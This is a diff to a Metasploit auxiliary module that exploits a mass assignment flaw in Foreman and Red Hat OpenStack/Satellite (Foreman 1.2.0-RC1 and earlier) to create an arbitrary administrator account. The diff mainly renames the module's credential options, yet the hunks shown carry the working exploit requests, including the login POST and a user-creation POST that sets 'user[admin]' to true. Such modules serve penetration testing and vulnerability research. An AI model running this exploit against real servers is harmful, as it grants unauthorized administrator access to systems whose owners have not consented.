@@ -18,9 +18,7 @@ class Metasploit4 < Msf::Auxiliary
 					This module exploits a mass assignment vulnerability in the 'create'
 				action of 'users' controller of Foreman and Red Hat OpenStack/Satellite
 				(Foreman 1.2.0-RC1 and earlier) by creating an arbitrary administrator
-				account.
-
-					For this exploit to work, your account must have 'create_users'
+				account. For this exploit to work, your account must have 'create_users'
 				permission (e.g., Manager role).
 			},
 			'Author'         => 'Ramon de C Valle',
@@ -41,11 +39,11 @@ class Metasploit4 < Msf::Auxiliary
 			[
 				Opt::RPORT(443),
 				OptBool.new('SSL', [true, 'Use SSL', true]),
-				OptString.new('MYUSERNAME', [true, 'Your username']),
-				OptString.new('MYPASSWORD', [true, 'Your password']),
-				OptString.new('USERNAME', [true, 'The username of the new admin account', 'admin']),
-				OptString.new('PASSWORD', [true, 'The password of the new admin account', 'changeme']),
-				OptString.new('EMAIL', [true, 'The email of the new admin account']),
+				OptString.new('USERNAME', [true, 'Your username']),
+				OptString.new('PASSWORD', [true, 'Your password']),
+				OptString.new('NEWUSERNAME', [true, 'The username of the new admin account']),
+				OptString.new('NEWPASSWORD', [true, 'The password of the new admin account']),
+				OptString.new('NEWEMAIL', [true, 'The email of the new admin account']),
 				OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
 			], self.class
 		)
@@ -57,8 +55,8 @@ class Metasploit4 < Msf::Auxiliary
 			'method'    => 'POST',
 			'uri'       => normalize_uri(target_uri.path, 'users', 'login'),
 			'vars_post' => {
-				'login[login]'    => datastore['MYUSERNAME'],
-				'login[password]' => datastore['MYPASSWORD']
+				'login[login]'    => datastore['USERNAME'],
+				'login[password]' => datastore['PASSWORD']
 			}
 		)
 
@@ -118,10 +116,10 @@ class Metasploit4 < Msf::Auxiliary
 				csrf_param                    => csrf_token,
 				'user[admin]'                 => 'true',
 				'user[auth_source_id]'        => '1',
-				'user[login]'                 => datastore['USERNAME'],
-				'user[mail]'                  => datastore['EMAIL'],
-				'user[password]'              => datastore['PASSWORD'],
-				'user[password_confirmation]' => datastore['PASSWORD']
+				'user[login]'                 => datastore['NEWUSERNAME'],
+				'user[mail]'                  => datastore['NEWEMAIL'],
+				'user[password]'              => datastore['NEWPASSWORD'],
+				'user[password_confirmation]' => datastore['NEWPASSWORD']
 			}
 		)
 
